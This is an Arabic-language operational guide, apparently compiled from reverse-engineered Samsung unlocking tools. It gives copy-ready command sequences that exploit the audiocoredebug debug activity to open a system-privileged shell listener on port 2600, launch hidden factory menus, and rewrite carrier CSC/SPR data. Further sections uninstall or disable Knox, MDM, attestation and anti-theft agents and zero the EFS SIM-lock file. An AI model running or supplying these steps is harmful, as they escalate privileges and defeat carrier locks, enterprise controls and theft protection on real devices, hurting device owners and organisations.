# التحقق من المودم + فتح المنافذ + تطبيقات سامسونج + تمرير الأوامر — الدليل الشامل

**التاريخ:** 24/10/2026  
**النطاق:** كل أمر يُستخدم للتحقق من المودم، فحص/فتح المنافذ، استغلال تطبيقات سامسونج، وتمرير الأوامر للمودم — مع إثبات المصدر وتحديد متى وكيف.

> **الملف المرافق:** `MODEM_PORT_COMMANDS.txt` (قائمة مسطحة قابلة للـgrep)

---

## 1) التحقق من المودم (فحص القنوات والجهاز)

### 1.1 أوامر AT للتحقق (مرصودة)

| الأمر | الوظيفة | العدد | الدليل |
|---|---|---:|---|
| `AT+DEVCONINFO` | معلومات المودم: MN/BASE/VER/MNC/MCC/PRD/SN/IMEI/UN | 35 | OBSERVED |
| `AT+SVCIFPGM=1,1` | Info 2 — معلومات إضافية | 16 | OBSERVED |
| `AT+CIMI` | IMSI — التأكد من قراءة الشريحة | 34 | OBSERVED |
| `AT+CPIN?` | حالة الشريحة (READY/SIM PIN/PUK/NOT INSERTED) | 29 | OBSERVED |
| `AT+CSQ` | شدة الإشارة (`+CSQ: <rssi>,<ber>`) | 38 | OBSERVED |
| `AT+CFUN?` | حالة الراديو (1=full, 4=airplane) | 27 | OBSERVED |
| `AT+CSCS` | مجموعة المحارف الحالية | 36 | OBSERVED |
| `AT+CLCK="PN",2` | فحص Network Lock | — | at-bridge |
| `AT+CLCK="PU",2` | فحص Network Subset Lock | — | at-bridge |
| `AT+CLCK="PP",2` | فحص Service Provider Lock | — | at-bridge |
| `AT+CLCK="PC",2` | فحص Corporate Lock | — | at-bridge |

**تسلسل التحقق الكامل (جاهز للنسخ):**

```text
AT+CPIN?
AT+CSQ
AT+CFUN?
AT+DEVCONINFO
AT+SVCIFPGM=1,1
AT+CIMI
AT+CLCK="PN",2
AT+CLCK="PU",2
AT+CLCK="PP",2
AT+CLCK="PC",2
```

### 1.2 أوامر at-bridge للتحقق

| الأمر | الوظيفة |
|---|---|
| `SCAN` | فحص كل عقد المودم والسوكيتات — يعرض: `[+] /dev/umts_atc0: Found (TTY AT - Read/Write OK)` |
| `STATUS` | حالة الجهاز + القناة النشطة + أقفال SIM |
| `LOCKS` / `SIMLOCK` | فحص أقفال SIM (CPIN + CLCK) — النتيجة: `SIMLOCK|CPIN=...|PN=...|PU=...|PP=...|PC=...` |
| `INFO` | معلومات مختصرة: `INFO|MODEL=...|CSC=...|AND=...|PATCH=...|DBG=...|UID=...|CH=...` |
| `-s` | CLI: فحص القنوات (نفس SCAN) |
| `-l` | CLI: فحص أقفال SIM |

**أولوية القنوات (init_best_channel):**

```text
IPC خام (/dev/umts_ipc0 → ipc1 → rfs0 → diag)
→ سوكيت rild (/dev/socket/rild → rild-oem → rild-debug → rild2 → qmux)
→ AT نصي (/dev/umts_atc0 → atc1 → at0 → at_distributor → smd11 → smd0/7 → tty*)
```

### 1.3 أوامر ADB للتحقق من المودم

```bash
# فحص العمليات
adb shell ps -A                                    # مرصود x3

# فحص خصائص المودم
adb shell getprop gsm.sim.state                    # مرصود x11
adb shell getprop gsm.network.type                 # مرصود x16
adb shell getprop gsm.version.baseband             # مرصود x12
adb shell getprop sys.usb.state                    # مرصود x11
adb shell getprop ro.product.model                 # مرصود x49

# فحص حالة الإقلاع
adb wait-for-device shell getprop sys.boot_completed   # مرصود x4
adb wait-for-device shell getprop sys.usb.state         # مرصود x4
adb shell getprop knox.kg.state                         # مرصود x2

# فحص سجل الراديو
adb shell logcat -b radio -d                       # مرصود x2
adb shell logcat -b radio -d | grep ': +.:.,' | tail -1  # مرصود x2

# مسح السجل قبل العملية
adb shell logcat -b radio -c                       # مرصود x4+2
adb shell logcat -b all -c                         # مرصود x2

# فحص الهوية
adb shell service call iphonesubinfo 1            # IMEI — مرصود x7
adb shell service call iphonesubinfo 1 s16 com.android.shell  # مرصود x4
adb shell service call iphonesubinfo 2            # مرصود x3
adb shell service call iphonesubinfo 15           # مرصود x3

# فحص الحزم
adb shell pm list packages                         # مرصود x3
adb shell pm path                                  # مرصود x2
```

### 1.4 فحص عقد المودم مباشرة (shell)

```bash
# فحص العقد الموجودة
ls -la /dev/umts_* /dev/smd* /dev/at_distributor* 2>/dev/null

# فحص السوكيتات
ls -la /dev/socket/rild* 2>/dev/null
ls -la /dev/socket/qmux_radio/ 2>/dev/null

# فحص أذونات القراءة/الكتابة
test -r /dev/umts_atc0 && echo "READ OK" || echo "READ DENIED"
test -w /dev/umts_atc0 && echo "WRITE OK" || echo "WRITE DENIED"

# فحص UID الحالي
id
```

---

## 2) فحص المنافذ المفتوحة

### 2.1 فحص البورت 2600 (المنفذ الرئيسي للأدوات)

```bash
# الطريقة المرصودة (الأساسية — مرصود x4):
adb shell echo id | toybox nc localhost 2600

# إذا رجع "uid=1000(system)" → المنفذ مفتوح وعامل
# إذا رجع خطأ/اتصال مرفوض → المنفذ مغلق

# فحص بديل (معياري):
adb shell "echo id > /dev/tcp/127.0.0.1/2600"
# أو:
adb shell netstat -tlnp 2>/dev/null | grep 2600
# أو:
adb shell cat /proc/net/tcp | grep 0A2C    # 2600 = 0x0A2C في /proc/net/tcp
```

**at-bridge (الطريقة البرمجية):**

```c
// at_bridge.c سطر 89-123
static int try_escalate_via_port_2600(int port) {
    if (getuid() == 1000 || getuid() == 0) return 0;
    // الاتصال بـ 127.0.0.1:2600
    // إرسال: "setprop ctl.stop ssud; id\n"
    // قراءة الرد → البحث عن "uid=1000"
}
```

### 2.2 فحص كل المنافذ المفتوحة

```bash
# معياري:
adb shell netstat -tlnp
adb shell ss -tlnp
adb shell cat /proc/net/tcp
adb shell cat /proc/net/tcp6

# فحص منفذ محدد:
adb shell netstat -tln | grep <port>
```

### 2.3 البورتات الحرجة للأدوات

| البورت | الاستخدام | فحصه |
|---|---|---|
| **2600** | shell relay (UID 1000) — مصعد الصلاحيات | `echo id \| nc localhost 2600` |
| 5037 | ADB server | `adb devices` |
| 5555-5559 | ADB TCP/IP | `adb connect <ip>:5555` |
| 7575/7576 | misc | فحص بـ netstat |

---

## 3) فتح المنفذ 2600 — كل الطرق

### الطريقة 1: حيلة `audiocoredebug` (الأساسية — داخل AT)

**المبدأ:** استغلال نشاط `AudioAdbShellActivity` في تطبيق `audiocoredebug` لفتح shell listener على البورت 2600 عبر `nc`.

**التسلسل الكامل (كل أمر داخل AT — مفكوك من الرام):**

```bash
# 1. ضبط المهلة وعدم انطفاء الشاشة
settings put system screen_off_timeout 600000 > /dev/null 2>&1
# ← Ghidra 0x2aa6d0, key=0x24

# 2. تعيين audiocoredebug كمساعد (3 مستويات)
settings put system assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
# ← Ghidra 0x2aa710, key=0x66

settings put Secure assistant com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
# ← Ghidra 0x2aa7a0, key=0xe6

settings put global function_key_config_doublepress_value com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.AudioAdbShellActivity > /dev/null 2>&1
# ← Ghidra 0x2aa830, key=0x9a

# 3. استدعاء المساعد (افتراضياً بصلاحية system)
input keyevent 219 > /dev/null 2>&1
# ← keyevent 219 = KEYCODE_ASSIST — Ghidra 0x2aa920, key=0xcf

# 4. التقاط واجهة النشاط
uiautomator dump /sdcard/window_dump.xml > /dev/null 2>&1
# ← Ghidra 0x2aa980, key=0x18
cat /sdcard/window_dump.xml
# ← Ghidra 0x2aa9c0, key=0xd4

# 5. البحث عن زر EXECUTE واستخراج إحداثياته
# regex داخل AT: <node[^>]*text="EXECUTE"[^>]*bounds="\[([0-9]+),([0-9]+)\]\[([0-9]+),([0-9]+)\]"[^>]*>
# ← Ghidra 0x2aa590, key=0x3f

# 6. الضغط على زر EXECUTE
input tap <x> <y>
# ← Ghidra 0x2aa5e8, key=0x13

# 7. كتابة أمر nc في حقل النص
input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
# ← Ghidra 0x2aa9e0, key=0xed

# 8. التنفيذ — TAB ثم ENTER
input keyevent 61 > /dev/null 2>&1
# ← keyevent 61 = KEYCODE_TAB — Ghidra 0x2aaa30, key=0x2b
input keyevent 66 > /dev/null 2>&1
# ← keyevent 66 = KEYCODE_ENTER — Ghidra 0x2aaa60, key=0x89

# 9. [اختياري] فحص خطأ التطبيق
# regex داخل AT: <node[^>]*resource-id="android:id/aerr_wait"[^>]*bounds="..."
# ← Ghidra 0x2aa600, key=0x4a

# 10. التنظيف
rm -rf /sdcard/window_dump.xml > /dev/null 2>&1
# ← Ghidra 0x2aa950, key=0xd5

# 11. إغلاق wifi لتسريع العملية
cmd wifi set-wifi-enabled disabled > /dev/null 2>&1
# ← Ghidra 0x2aab30, key=0xc3

# 12. فتح القائمة للتأكد
input keyevent 82 > /dev/null 2>&1
# ← keyevent 82 = KEYCODE_MENU — Ghidra 0x2aab70, key=0xc1

# 13. الرجوع للرئيسية
input keyevent 3 > /dev/null 2>&1
# ← keyevent 3 = KEYCODE_HOME — Ghidra 0x2aa6a0, key=0x13
```

**النتيجة:** مستمع shell على `127.0.0.1:2600` يعمل بصلاحية **UID 1000 (system)**.

**التحقق:**

```bash
adb shell echo id | toybox nc localhost 2600
# → "uid=1000(system)"
```

### الطريقة 2: `FactoryTestLauncher`

```bash
# فحص/إعادة تهيئة
pm clear com.samsung.android.FactoryTestLauncher > /dev/null 2>&1
# ← Ghidra 0x2aaa90, key=0x20

# فتح الإعدادات (شرط مسبق)
am start -a android.settings.SETTINGS > /dev/null 2>&1
# ← Ghidra 0x2aaaf0, key=0x91

# اسم الحزمة داخل AT:
# com.samsung.android.FactoryTestLauncher
# ← Ghidra 0x2aaba0, key=0x46
```

### الطريقة 3: `IOTHiddenMenu`

```bash
# عبر echo|nc (مرسل للبورت 2600):
echo "am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466 > /dev/null 2>&1"
# ← Ghidra 0x2aa390, key=0x7f
```

### الطريقة 4: مباشرة عبر root/su (مرصود)

```bash
# إذا كان الجهاز معمّى (rooted):
adb shell su -c 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
# أو:
adb shell nc -s 127.0.0.1 -p 2600 -L /system/bin/sh
```

### الطريقة 5: `PreconfigActivity` عبر CID Manager (مرصود — Base64)

**الأمر المرصود:**
```bash
adb shell echo ZWNobyBhbSBzdGFydCAtbiBjb20uc2Ftc3VuZy5hbmRyb2lkLmNpZG1hbmFnZXIvLm1vZHVsZXMucHJlY29uZmlnLlByZWNvbmZpZ0FjdGl2aXR5IC1hIGNvbS5zYW1zdW5nLmFuZHJvaWQu
```

**النص المفكوك:**
```bash
echo am start -n com.samsung.android.cidmanager/.modules.preconfig.PreconfigActivity -a com.samsung.android.
```

**الدلالة:** استغلال نشاط Preconfig في تطبيق `CID Manager` لتغيير CSC/المشغل.

### الطريقة 6: عبر Shizuku (مرصود)

```bash
# تثبيت Shizuku privileged API
adb shell am start -n moe.shizuku.privileged.api/moe.shizuku.manager.MainActivity
adb shell pm grant com.cdmayemen.volte moe.shizuku.manager.permission.API_V23
```

### استعادة الوضع الطبيعي بعد العملية (مرصود)

```bash
# استعادة المساعد الأصلي (Google):
adb shell settings put  Secure assistant  com.google.android.googlequicksearchbox/com.google.android.voiceinteraction.GsaVoiceInteractionService > /dev/null 2>&1
# مرصود x2

# مسح audiocoredebug:
pm clear com.sec.android.app.audiocoredebug > /dev/null 2>&1
# ← Ghidra 0x2aa8e0, key=0x22

# إكمال إعداد المستخدم:
adb shell settings put secure user_setup_complete 1
# مرصود x2
```

---

## 4) تطبيقات سامسونج المستخدمة (الكل)

### 4.1 تطبيقات تُستغل لفتح المنفذ

| التطبيق | النشاط | الاستخدام | الدليل |
|---|---|---|---|
| `com.sec.android.app.audiocoredebug` | `AudioAdbShellActivity` | فتح shell على 2600 | AT strings (7 مواضع) + observed |
| `com.samsung.android.FactoryTestLauncher` | — | فتح قائمة المصنع | AT `0x2aaba0` |
| `com.sec.hiddenmenu` | `IOTHiddenMenu` | قائمة خفية (كود: 7267864872) | AT `0x2aa390` |
| `com.samsung.android.cidmanager` | `PreconfigActivity` | تغيير CSC | Base64 observed |

### 4.2 تطبيقات تُفحص أو تُدير

| التطبيق | الأمر | الدليل |
|---|---|---|
| `com.samsung.rms.retailagent.global` | `pm path` + `am force-stop` | AT `0x2aa4e0` |
| `com.sdet.fotaagent` | فحص | AT `0x2aa510` |
| `com.skatd.unlock` | `pm list packages \| grep` | AT `0x2aa530` |
| `KEYTool.SRV4` | `pm path KEYTool.SRV4` | PowerShell observed |

### 4.3 تطبيقات تُزال (pm uninstall — مرصود)

| التطبيق | الأمر | العدد |
|---|---|---:|
| `com.sec.android.AutoPreconfig` | `pm uninstall -k --user -0 ...` | 2 |
| `com.sec.android.CarrierCodeChanger` | `pm uninstall -k --user 0 ...` | 2 |
| `com.samsung.android.FactoryTestLauncher` | `pm uninstall ...` | 2 |
| `com.samsung.android.aircommandmanager` | `pm uninstall -k --user 0 ...` | 2 |
| `com.samsung.android.cidmanager` | `pm uninstall -k --user 0 ...` | 2 |

### 4.4 تطبيقات Knox تُعطَّل/تُزال (مرصود)

| التطبيق | الأمر | العدد |
|---|---|---:|
| `com.sec.knox.knoxsetupwizardclient` | `pm uninstall` + `pm clear` + `am force-stop` | 2+2+2 |
| `com.sec.knox.foldercontainer` | `pm uninstall` + `pm clear` | 2+2 |
| `com.sec.knox.kccagent` | `pm uninstall` + `pm clear` | 2+2 |
| `com.sec.knox.switcher` | `pm uninstall` + `pm clear` | 2+2 |
| `com.samsung.knox.securefolder` | `pm uninstall` + `pm clear` + `pm disable-user` | 2+2+2 |
| `com.samsung.android.knox.containeragent` | `pm uninstall` + `pm disable-user` | 2+2 |
| `com.samsung.android.knox.containercore` | `pm uninstall` + `pm disable-user` | 2+2 |
| `com.samsung.knox.keychain` | `pm disable-user` | 2 |
| `com.samsung.knox.securefolder.setuppage` | `pm disable-user` | 2 |
| `com.sec.enterprise.knox.cloudmdm.smdms` | `pm uninstall` + `pm clear` + `pm disable-user` | 2+2+2 |
| `com.sec.enterprise.knox.attestation` | `pm disable-user` | 2 |
| `com.knox.vpn.proxyhandler` | `pm uninstall` + `pm clear` + `pm disable-user` | 2+2+2 |
| `com.postmates.android.merchant` | `pm uninstall` + `pm clear` | 2+2 |
| `com.absolute.android.agent` | `pm disable-user` | 2 |
| `com.planetcellinc.ressvc` | `pm disable-user` | 2 |
| `com.google.android.apps.work.oobconfig` | `pm disable-user` + `pm uninstall -k` | 2+2 |

### 4.5 تطبيقات أخرى مرصودة

| التطبيق | الاستخدام | العدد |
|---|---|---:|
| `com.cdmayemen.volte` | VoLTE config — `am broadcast -a ...ACTION_CONFIG --es config 1,e` / `2,e` | 2+2 |
| `moe.shizuku.privileged.api` | Shizuku — `am start -n ...MainActivity` | 1 |
| `com.octoplusbox.octosprint` | Octoplus — `am start -n ...MainActivity` | 2 |
| `com.lge.lgcontentsetting` | LG — `am start ...LGContentSettingsActivity` | 2 |
| `com.google.android.gsf.login` | Google — `am start -n ...LoginActivity` | 2+2 |

---

## 5) تمرير الأوامر للمودم (كل القنوات)

### 5.1 عبر منفذ AT نصي (الأسهل)

```bash
# كتابة مباشرة:
adb shell "echo 'AT+DEVCONINFO' > /dev/umts_atc0"
adb shell "cat /dev/umts_atc0"

# أو عبر at-bridge:
AT:AT+DEVCONINFO
# في الوضع التفاعلي → يُرسل عبر القناة النشطة
```

**العقد المتاحة (بترتيب الأولوية):**

```text
/dev/umts_atc0 → atc1 → at0 → at_distributor → at_distributor0 → smd11 → smd0 → smd7
→ ttyGS0 → ttyACM0 → ttyUSB0
```

### 5.2 عبر سوكيت rild (Parcel)

```c
// البنية: [4B طول BE] + [4B req_id=59] + [4B token] + [4B dlen] + [بيانات IPC]
// at-bridge: send_rild_oem_parcel()
// السوكيت: /dev/socket/rild → rild-oem → rild-debug → rild2 → qmux
```

### 5.3 عبر libsecril-client.so (الأقوى)

```c
// تحميل المكتبة
void *lib = dlopen("libsecril-client.so", RTLD_NOW);
// البحث عن الرمز
send_recv_cmd_t fn = dlsym(lib, "send_recv_cmd");
// الاستدعاء
int code = fn(request, &response, &resp_len);
// AT يطبع: "[i] Found 'send_recv_cmd' in %s."
```

### 5.4 عبر البورت 2600 (echo | nc) — طريقة AT

```bash
# بناء الأمر:
echo '<command>' | /system/bin/toybox nc 127.0.0.1 2600 > /dev/null 2>&1
# ← AT Ghidra 0x2aa308 ('echo ') + 0x2aa310 (لاحقة nc)

# أمثلة:
echo 'AT+DEVCONINFO' | toybox nc 127.0.0.1 2600
echo 'setprop ctl.stop ssud; id' | toybox nc 127.0.0.1 2600    # at-bridge
echo 'am start -n com.sec.hiddenmenu/...' | toybox nc 127.0.0.1 2600
```

### 5.5 أوامر الجلسة داخل AT (stdin → أداة → المودم)

| الأمر | الوظيفة |
|---|---|
| `AT+<cmd>` | تمرير أمر AT للمودم |
| `GETSPR` | قراءة SPR |
| `SETSPR` | كتابة SPR (MCC/MNC) |
| `SRELOCK1` | إعادة قفل بقائمة MCC/MNC |
| `AT+AKSEEDNO=0` / `=1,0` | مصادقة |
| `AT+DEVCONINFO` | معلومات المودم |
| `AT+CPIN?` | حالة الشريحة |
| `AT+CLCK="PN",2` | فحص قفل |
| `EXIT` / `exit` | إنهاء |

### 5.6 عبر at-bridge (hex IPC)

```bash
# تغيير CSC (5 حزم):
HEX:0601000E0000<HEX_CSC>0000<HEX_CSC>    # 1/5
HEX:060100090000<HEX_CSC>                  # 2/5
HEX:060100120000<HEX_CSC>0000<HEX_CSC><HEX_CSC>  # 3/5
# [4/5] + [5/5] — بيانات إضافية

# أو من سطر الأوامر:
adb shell /data/local/tmp/AT -x 0601000E0000...
```

---

## 6) أوامر إعادة التشغيل والتحكم في الإقلاع

### 6.1 أوامر AT (مرصودة)

| الأمر | الوظيفة | العدد |
|---|---|---:|
| `AT+BKREBOOT=1` | إعادة تشغيل | 13 |
| `AT+NBOOT` | إقلاع عادي | 4 |
| `AT%USB=adb,mtp` | تبديل وضع USB إلى ADB+MTP | 13 |

### 6.2 أوامر adb reboot (مرصودة)

| الأمر | الوظيفة | العدد |
|---|---|---:|
| `adb reboot` | إعادة تشغيل عادية | 6 |
| `adb reboot bootloader` | إقلاع إلى bootloader | 2 |
| `adb reboot download` | وضع التنزيل (Odin) | 2 |
| `adb reboot debug0x4948` | إقلاع debug بكود 0x4948 | 4 |
| `adb reboot debug0x4f4c` | إقلاع debug بكود 0x4f4c | 2 |
| `adb reboot cpdebug0x5500` | إقلاع CP debug بكود 0x5500 | 2 |
| `adb reboot sideload` | وضع sideload | 2 |
| `adb reboot sideload-auto-reboot` | sideload مع إعادة تشغيل | 2 |
| `adb reboot-bootloader` | إقلاع إلى bootloader | 2 |

### 6.3 أوامر الطاقة (مرصودة)

| الأمر | الوظيفة | الدليل |
|---|---|---|
| `svc power stayon true` | منع السكون | KEY-Tool flow |
| `cat /proc/uptime` | فحص وقت التشغيل | KEY-Tool flow |
| `input keyevent KEYCODE_HOME` | زر الرئيسية | مرصود x16 |
| `input keyevent 3` | زر الرئيسية (كود 3) | AT `0x2aa6a0` |
| `input keyevent 4` | زر الرجوع (كود 4) | AT `0x2732f0` |
| `input keyevent 82` | زر القائمة (كود 82) | AT `0x2aab70` |
| `input keyevent 219` | زر المساعد (كود 219) | AT `0x2aa920` |
| `input keyevent 61` | زر TAB (كود 61) | AT `0x2aaa30` |
| `input keyevent 66` | زر ENTER (كود 66) | AT `0x2aaa60` |

---

## 7) أوامر EFS / SLB (فوق مستوى المودم — مرصودة)

```bash
# النسخ الاحتياطي:
adb shell su -c 'mv /efs/root/data/SLB.bin /efs/root/data/SLB.bin.bak'
# مرصود x2 (مع وبين اقتباس)

# الكتابة (صفر = فك القفل):
adb shell su -c 'echo 00000000 > /efs/root/data/SLB.bin'
# مرصود x2

# الحماية:
adb shell su -c 'chmod 0400 /efs/root/data/SLB.bin'
# مرصود x2
```

**SLB = SIM Lock Byte** — ملف قفل الشريحة في EFS. هذه أوامر **كتابة مباشرة** على مستوى نظام الملفات (تتطلب root).

---

## 8) التسلسل الكامل من البداية للنهاية (المرجع العملي)

```text
─── المرحلة 1: التحقق ───
adb devices
adb shell ps -A
adb shell getprop sys.usb.state
adb shell getprop ro.product.model
adb wait-for-device shell getprop sys.boot_completed
adb shell logcat -b radio -c

─── المرحلة 2: فحص المودم ───
adb shell ls -la /dev/umts_* /dev/smd* 2>/dev/null
adb shell ls -la /dev/socket/rild* 2>/dev/null
# [أو عبر at-bridge: SCAN]

─── المرحلة 3: فتح المنفذ 2600 ───
adb shell settings put system screen_off_timeout 600000
adb shell settings put Secure assistant com.sec.android.app.audiocoredebug/...AudioAdbShellActivity
adb shell input keyevent 219
adb shell uiautomator dump /sdcard/window_dump.xml
adb shell cat /sdcard/window_dump.xml
adb shell input tap <x> <y>                    # زر EXECUTE
adb shell input text 'toybox nc -s 127.0.0.1 -p 2600 -L /system/bin/sh'
adb shell input keyevent 61
adb shell input keyevent 66
adb shell rm -rf /sdcard/window_dump.xml

─── المرحلة 4: التحقق من المنفذ ───
adb shell echo id | toybox nc localhost 2600
# → "uid=1000(system)" ?

─── المرحلة 5: العمليات عبر المنفذ ───
adb push <module> /data/local/tmp/athun
adb shell chmod 0777 /data/local/tmp/athun
# بدء الجلسة:
#   AT+AKSEEDNO=0
#   AT+DEVCONINFO
#   GETSPR
#   SETSPR + payload
#   exit
adb shell rm /data/local/tmp/athun

─── المرحلة 6: الاستعادة ───
adb shell settings put Secure assistant com.google.android.googlequicksearchbox/...GsaVoiceInteractionService
adb shell pm clear com.sec.android.app.audiocoredebug
adb shell settings put secure user_setup_complete 1
adb shell logcat -b radio -c
adb reboot
```

---

## 9) جدول keyevent (كل الأكواد المستخدمة)

| الكود | الاسم | الوظيفة | الدليل |
|---|---|---|---|
| 3 | KEYCODE_HOME | الرئيسية | AT `0x2aa6a0` + observed x16 |
| 4 | KEYCODE_BACK | الرجوع | AT `0x2732f0` |
| 61 | KEYCODE_TAB | TAB (تنقل بين الحقول) | AT `0x2aaa30` |
| 66 | KEYCODE_ENTER | ENTER (تنفيذ) | AT `0x2aaa60` |
| 82 | KEYCODE_MENU | القائمة | AT `0x2aab70` + KEY-Tool |
| 219 | KEYCODE_ASSIST | المساعد (يفتح audiocoredebug) | AT `0x2aa920` |

---

## 10) مصفوفة الحضور

| الأمر/التقنية | داخل AT | at-bridge | مرصود (L24) | المصدر |
|---|---|---|---|---|
| `echo '<x>' \| nc 2600` | ✅ `0x2aa308`+`0x2aa310` | ✅ `try_escalate` | ✅ x4 | AT + observed |
| `settings put ... assistant` | ✅ `0x2aa710`/`0x2aa7a0`/`0x2aa830` | ✅ header | ✅ x2 (استعادة) | AT + observed |
| `input keyevent 219` | ✅ `0x2aa920` | ✅ header | — | AT |
| `input text 'nc ...'` | ✅ `0x2aa9e0` | ✅ header | — | AT |
| `uiautomator dump` | ✅ `0x2aa980` | ✅ header | — | AT |
| `input tap <x> <y>` | ✅ `0x2aa5e8` | — | — | AT |
| regex `EXECUTE` | ✅ `0x2aa590` | — | — | AT |
| `pm clear audiocoredebug` | ✅ `0x2aa8e0` | ✅ | — | AT |
| `cmd wifi set-wifi-enabled disabled` | ✅ `0x2aab30` | — | — | AT |
| `am start ... IOTHiddenMenu` | ✅ `0x2aa390` | ✅ header | — | AT |
| `pm clear FactoryTestLauncher` | ✅ `0x2aaa90` | ✅ | — | AT |
| `am start -a android.settings.SETTINGS` | ✅ `0x2aaaf0` | ✅ header | — | AT |
| `ps -A` | — | — | ✅ x3 | Q-Unlocker |
| `echo id \| nc localhost 2600` | — | — | ✅ x4 | observed |
| `service call iphonesubinfo 1` | — | — | ✅ x7 | observed |
| `SLB.bin` operations | — | — | ✅ x2 لكل | observed |
| Knox pm uninstall/disable | — | — | ✅ x2 لكل | observed |
| `PreconfigActivity` (Base64) | — | — | ✅ x2 | observed |
| Shizuku | — | — | ✅ x1 | observed |

---

## 11) المصادر

### AT (HUNTER-UNLOCKER)
- `C:\Users\pc5\Documents\AT\AT_Source_Extract\AT_ALL_STRINGS.json` — 141 نصاً مفكوكاً.
- `C:\Users\pc5\Documents\AT\AT_Source_Extract\AT_XREF_HITS.json` — مراجع النصوص.

### at-bridge
- `C:\Users\pc5\Documents\GitHub\gsmtools\at-bridge\jni\at_bridge.c`:
  - سطر 89–123: `try_escalate_via_port_2600()`
  - سطر 129–158: ج_tables العقد والسوكيتات
  - سطر 161–222: فتح القنوات والأولوية
  - سطر 339–365: `send_rild_oem_parcel()`
  - سطر 593–624: الأوامر التفاعلية
- `C:\Users\pc5\Documents\GitHub\gsmtools\at-bridge\jni\all_gsm_commands.h` — سطر 18–72: أوامر الشل.

### سجلات مرصودة
- `C:\Users\pc5\Documents\AT\OBSERVED_AT_COMMANDS.txt` — 419 أمراً.
- `C:\Users\pc5\Documents\GitHub\PhoenixGSM\tools\MonitoringToolkit\...\Logs\L24_SourceSentinel\*.jsonl`

### أدوات
- `C:\Users\pc5\Documents\GitHub\PhoenixGSM\tools\DmpScanner\keytool_exploit_flow.txt` — svc power, cat /proc/uptime, Send AT Command.
- `C:\Users\pc5\Documents\GitHub\PhoenixGSM\tools\DmpScanner\region_results.txt` — adb -s %1 shell ps -A, pm list packages.
- `C:\Users\pc5\Documents\GitHub\PhoenixGSM\tools\DmpScanner\relock_extracted_results.txt` — athun push/chmod.

---

**نهاية الملف.**  
**القائمة المسطحة:** `MODEM_PORT_COMMANDS.txt`  
**مكتبات RIL:** `LIBRIL_COMMANDS.md`  
**أوامر MCC/MNC:** `MCC_MNC_COMMANDS.md`
